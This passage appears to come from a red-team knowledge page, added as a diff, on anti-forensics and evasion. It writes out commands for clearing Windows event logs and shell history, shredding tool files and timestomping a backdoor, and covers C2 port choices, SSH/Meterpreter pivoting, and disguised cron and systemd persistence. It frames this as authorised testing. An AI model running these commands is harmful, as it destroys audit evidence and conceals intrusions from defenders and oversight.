+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">wevtutil cl </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">&quot;Microsoft-Windows-PowerShell/Operational&quot;</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">wevtutil cl </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">&quot;Microsoft-Windows-Sysmon/Operational&quot;</span></span></code></pre></figure>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="github-light github-dark"><code data-language="powershell" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="function">Clear-EventLog</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">LogName Security</span></span>
+<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="function">Get-WinEvent</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ListLog </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">*</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator"> |</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="function"> ForEach-Object</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation"> { wevtutil cl </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="punctuation">$_</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal">.LogName }  </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># extremely loud / harmful</span></span></code></pre></figure>
+<blockquote>
+<p><strong>Warning:</strong> Mass log clear is a <strong>high-fidelity SOC alert</strong> (Event ID 1102 — audit log cleared). Often worse OPSEC than leaving logs.</p>
+</blockquote>
+<h3 id="83-powershell-history">8.3 PowerShell History<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#83-powershell-history" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="github-light github-dark"><code data-language="powershell" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="function">Get-History</span></span>
+<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="function">Clear-History</span></span>
+<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="function">Remove-Item</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation"> (</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="function">Get-PSReadlineOption</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">).HistorySavePath</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Default path often:</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span></span></code></pre></figure>
+<h3 id="84-prefetch--shimcache--amcache">8.4 Prefetch / ShimCache / Amcache<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#84-prefetch--shimcache--amcache" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Artifact</th><th>Path / store</th><th>Notes</th></tr></thead><tbody><tr><td>Prefetch</td><td><code>C:\Windows\Prefetch\*.pf</code></td><td>Evidence of execution</td></tr><tr><td>ShimCache</td><td>Registry SYSTEM</td><td>Execution evidence</td></tr><tr><td>Amcache</td><td><code>Amcache.hve</code></td><td>Program inventory</td></tr><tr><td>BAM/DAM</td><td>Registry</td><td>User execution</td></tr></tbody></table></div>
+<p>Deleting prefetch needs admin; defenders use multiple overlapping artifacts — deleting one rarely erases history.</p>
+<h3 id="85-usn-journal--mft">8.5 USN Journal / MFT<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#85-usn-journal--mft" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Advanced anti-forensics targets NTFS metadata; modern IR still recovers substantial activity from EDR telemetry off-host.</p>
+<h3 id="86-scheduled-task--service-history">8.6 Scheduled Task / Service History<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#86-scheduled-task--service-history" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>SCM and task scheduler leave files under <code>C:\Windows\System32\Tasks</code> and registry — clean persistence properly rather than only wiping logs.</p>
+<hr/>
+<h2 id="9-shell-history--file-cleanup">9. Shell History &amp; File Cleanup<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#9-shell-history--file-cleanup" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="91-linux-history">9.1 Linux History<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#91-linux-history" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Disable for session (authorized OPSEC)</span></span>
+<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="function">unset</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> HISTFILE</span></span>
+<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="keyword">export</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal"> HISTSIZE</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value">0</span></span>
+<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="function">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> +o</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> history</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment">   # bash</span></span>
+<span data-line> </span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Clear existing</span></span>
+<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="function">history</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -c</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">rm</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ~/.bash_history</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ~/.zsh_history</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Or selective</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">sed</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> '/msfvenom\|linpeas\|nc /d'</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ~/.bash_history</span></span></code></pre></figure>
+<p>Note: some systems use centralized logging of shell commands (auditd <code>execve</code>).</p>
+<h3 id="92-secure-delete-myths">9.2 Secure Delete Myths<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#92-secure-delete-myths" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">shred</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> tool.bin</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">wipe</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> tool.bin</span></span></code></pre></figure>
+<p>On <strong>SSDs and cloud disks</strong>, shred may not securely erase due to wear leveling and snapshots. Cloud volume snapshots can retain data regardless.</p>
+<h3 id="93-temp-file-hygiene">9.3 Temp File Hygiene<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#93-temp-file-hygiene" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">rm</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -rf</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /tmp/.enum</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value">*</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /dev/shm/.e</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value">*</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator"> 2></span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">/dev/null</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">rm</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /tmp/linpeas.sh</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /tmp/a.out</span></span></code></pre></figure>
+<p>Windows:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="cmd" data-theme="github-light github-dark"><code data-language="cmd" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal">del /f /q C:\Users\</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="keyword">Public</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">\</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">*</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.exe</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="normal">del /f /q </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">%</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">TEMP</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">%</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">\</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">*</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.exe</span></span></code></pre></figure>
+<h3 id="94-timestomping">9.4 Timestomping<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#94-timestomping" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">touch</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /bin/ls</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /tmp/backdoor</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># or timedatectl / touch -t</span></span></code></pre></figure>
+<p>Windows: tools to alter <code>$SI</code> / <code>$FN</code> timestamps — known to IR; also leaves its own traces.</p>
+<h3 id="95-prefer-non-persistence">9.5 Prefer Non-Persistence<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#95-prefer-non-persistence" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Best cleanup is <strong>never writing</strong> the artifact: memory-only execution, existing admin channels, cloud API actions that look like DevOps.</p>
+<hr/>
+<h2 id="10-network-evasion">10. Network Evasion<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#10-network-evasion" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="101-port--protocol-choices">10.1 Port &amp; Protocol Choices<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#101-port--protocol-choices" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Choice</th><th>Rationale</th><th>Risk</th></tr></thead><tbody><tr><td>443/TCP HTTPS</td><td>Blends with web</td><td>TLS inspection / JA3</td></tr><tr><td>80/HTTP</td><td>Common</td><td>Content inspection</td></tr><tr><td>53/DNS</td><td>Sometimes open</td><td>DNS exfil highly monitored in mature orgs</td></tr><tr><td>ICMP</td><td>Rare allow</td><td>Anomalous size/timing</td></tr><tr><td>SMB/WinRM internal</td><td>Looks admin</td><td>Lateral movement rules</td></tr></tbody></table></div>
+<h3 id="102-domain-fronting--cdn--redirectors">10.2 Domain Fronting / CDN / Redirectors<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#102-domain-fronting--cdn--redirectors" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Historically used to hide C2 behind trusted domains; many providers cracked down. Redirector chains (VPS hop points) remain standard red team infrastructure — keep out of client IP space reputation issues.</p>
+<h3 id="103-dns-tunneling-concept">10.3 DNS Tunneling (Concept)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#103-dns-tunneling-concept" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Encode data in DNS queries/responses (dnscat2, iodine, etc.). <strong>Slow</strong>; distinctive query patterns; easy win for detections if DNS logging exists.</p>
+<h3 id="104-proxy-aware-payloads">10.4 Proxy-Aware Payloads<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#104-proxy-aware-payloads" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Enterprise hosts often <strong>must</strong> use HTTP proxy. Payloads that ignore proxy fail; proxy-aware C2 succeeds but appears in proxy logs — still better than non-functional beacons.</p>
+<h3 id="105-ssh--socks-pivoting">10.5 SSH / SOCKS Pivoting<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#105-ssh--socks-pivoting" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">ssh</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -D</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> 9050</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> user@jump</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">proxychains</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> nmap</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ...</span></span></code></pre></figure>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Meterpreter</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">portfwd</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">route</span></span></code></pre></figure>
+<h3 id="106-traffic-padding--jitter">10.6 Traffic Padding &amp; Jitter<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#106-traffic-padding--jitter" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Beacons with jitter and reasonable sleep evade simple “regular interval” rules but not full decryption + behavioral UEBA.</p>
+<h3 id="107-host-firewall-stealth">10.7 Host Firewall Stealth<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#107-host-firewall-stealth" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Avoid enabling new listening ports on well-monitored servers; reverse connects usually preferred.</p>
+<hr/>
+<h2 id="11-stealth-persistence-patterns">11. Stealth Persistence Patterns<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#11-stealth-persistence-patterns" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>Only with ROE approval; always inventory for removal.</p>
+<h3 id="111-linux-systemd-timers">11.1 Linux: systemd Timers<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#111-linux-systemd-timers" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># User-level less visible than /etc sometimes</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ~/.config/systemd/user/</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># service + timer unit that runs infrequently</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">systemctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --user</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> enable</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --now</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> sync.timer</span></span></code></pre></figure>
+<p>System-level:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># /etc/systemd/system/backup.service + backup.timer</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Disguised as backup/monitoring names</span></span></code></pre></figure>
+<h3 id="112-linux-cron-disguise">11.2 Linux: Cron Disguise<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#112-linux-cron-disguise" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="cron" data-theme="github-light github-dark"><code data-language="cron" data-theme="github-light github-dark" style="display:grid;"><span data-line><span># Looks similar to existing entries</span></span>
+<span data-line><span>17 * * * * root /usr/local/bin/logrotate-helper >/dev/null 2>&amp;1</span></span></code></pre></figure>
+<p>Use names matching the environment; defenders baseline cron.</p>
+<h3 id="113-windows-wmi-event-subscriptions">11.3 Windows: WMI Event Subscriptions<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#113-windows-wmi-event-subscriptions" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Permanent WMI subscriptions can launch payloads on events (logon, timed). Harder for juniors to find; Autoruns / dedicated hunters catch them.</p>
+<h3 id="114-windows-disguised-scheduled-tasks">11.4 Windows: Disguised Scheduled Tasks<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#114-windows-disguised-scheduled-tasks" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
